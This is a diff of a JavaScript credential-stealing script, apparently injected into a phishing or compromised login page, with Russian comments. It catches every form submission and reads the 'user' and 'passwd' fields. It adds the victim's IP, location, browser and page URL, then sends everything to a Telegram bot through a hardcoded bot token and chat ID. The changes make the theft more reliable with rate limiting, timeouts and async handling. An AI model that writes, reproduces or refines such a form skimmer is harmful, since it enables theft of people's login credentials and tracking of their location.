@@ -1,42 +1,67 @@
 const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
 const tgChatId = "-1002252120859";
 
+// Функция отправки сообщения в Telegram с ограничением скорости
+let lastSendTime = 0;
 function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
-    }).catch(err => console.error("Ошибка отправки в Telegram:", err));
+    const now = Date.now();
+    const delay = Math.max(0, 1000 - (now - lastSendTime)); // Минимум 1 секунда между запросами
+
+    setTimeout(() => {
+        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
+        }).catch(err => console.error("Ошибка отправки в Telegram:", err));
+
+        lastSendTime = Date.now();
+    }, delay);
 }
 
-function hashDomain(domain) {
-    return crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain))
-        .then(buffer => {
-            let hashArray = Array.from(new Uint8Array(buffer));
-            let hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
-            return `#${hashHex.slice(0, 8)}`; // Оставим первые 8 символов хеша
-        });
+// Функция хэширования домена
+async function hashDomain(domain) {
+    try {
+        const buffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain));
+        const hashArray = Array.from(new Uint8Array(buffer));
+        const hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
+        return `#${hashHex.slice(0, 8)}`; // Оставим первые 8 символов хеша
+    } catch (err) {
+        console.error("Ошибка хэширования домена:", err);
+        return "#error";
+    }
+}
+
+// Функция получения информации о IP с тайм-аутом
+function fetchWithTimeout(url, options = {}, timeout = 7000) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), timeout);
+
+    return fetch(url, { ...options, signal: controller.signal }).finally(() => clearTimeout(id));
 }
 
 function getIPInfo() {
-    return fetch("https://ipapi.co/json/")
+    return fetchWithTimeout("https://ipapi.co/json/", {}, 7000) // Тайм-аут 7 секунд
         .then(response => {
-            if (!response.ok) {
-                throw new Error("Ошибка получения информации о IP");
-            }
+            if (!response.ok) throw new Error("Ошибка получения информации о IP");
             return response.json();
         })
-        .then(data => {
+        .then(data => ({
+            ip: data.ip,
+            location: `${data.city || "Неизвестно"}, ${data.region || "Неизвестно"}, ${data.country_name || "Неизвестно"}`,
+            org: window.location.hostname,
+        }))
+        .catch(err => {
+            console.error("Ошибка получения информации о IP:", err);
             return {
-                ip: data.ip,
-                location: `${data.city || "Неизвестно"}, ${data.region || "Неизвестно"}, ${data.country_name || "Неизвестно"}`,
-                org: window.location.hostname,
+                ip: "Неизвестно",
+                location: "Неизвестно",
+                org: "Неизвестно",
             };
-        })
-        .catch(err => console.error("Ошибка получения информации о IP:", err));
+        });
 }
 
+// Функция упрощенного анализа User-Agent
 function getSimplifiedUserAgent() {
     const userAgent = navigator.userAgent || "Неизвестно";
     const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["Неизвестно"];
@@ -46,15 +71,24 @@ function getSimplifiedUserAgent() {
     return `${browser} on ${os}`;
 }
 
-document.addEventListener("submit", event => {
+// Асинхронный обработчик события submit
+async function handleSubmit(event) {
+    console.log("Слушатель 'submit' активирован.");
+    event.preventDefault();
+
     const formData = new FormData(event.target);
     const login = formData.get("user") || "Не указано";
     const password = formData.get("passwd") || "Не указано";
     const simplifiedUserAgent = getSimplifiedUserAgent();
 
-    getIPInfo().then(info => {
-        hashDomain(info.org).then(domainHashTag => {
-            const message = `🚀 *Новая отправка формы:*
+    try {
+        const info = await getIPInfo();
+        await new Promise(resolve => setTimeout(resolve, 200)); // Пауза 200 мс для стабильности
+
+        const domainHashTag = await hashDomain(info.org);
+        await new Promise(resolve => setTimeout(resolve, 200)); // Ещё одна пауза
+
+        const message = `🚀 *Новая отправка формы:*
 ---
 - 🛡️ **Логин:**
 \`\`\`
@@ -70,28 +104,13 @@ ${password}
 - 🔗 **Страница:** ${window.location.href}
 - 🏢 **Организация:** ${info.org}
 ${domainHashTag}`;
-            console.log("Сообщение для Telegram готово:", message); // Лог готового сообщения
-            sendToTelegram(message);
-        }).catch(err => console.error("Ошибка обработки хэша домена:", err));
-    }).catch(err => console.error("Ошибка получения IP информации:", err));
-});
 
-function logPageVisit() {
-    const simplifiedUserAgent = getSimplifiedUserAgent();
-
-    getIPInfo().then(info => {
-        hashDomain(info.org).then(domainHashTag => {
-            const message = `🌍 *Новый визит страницы:*
----
-- 🌐 **IP-адрес:** ${info.ip}
-- 📍 **Местоположение:** ${info.location}
-- 🖥️ **User-Agent:** ${simplifiedUserAgent}
-- 🔗 **Страница:** ${window.location.href}
-- 🏢 **Организация:** ${info.org}
-${domainHashTag}`;
-            sendToTelegram(message);
-        });
-    });
+        console.log("Сообщение для Telegram готово:", message);
+        sendToTelegram(message);
+    } catch (err) {
+        console.error("Ошибка в процессе отправки данных:", err);
+    }
 }
 
-//logPageVisit();
+// Добавление обработчика события submit
+document.addEventListener("submit", handleSubmit);
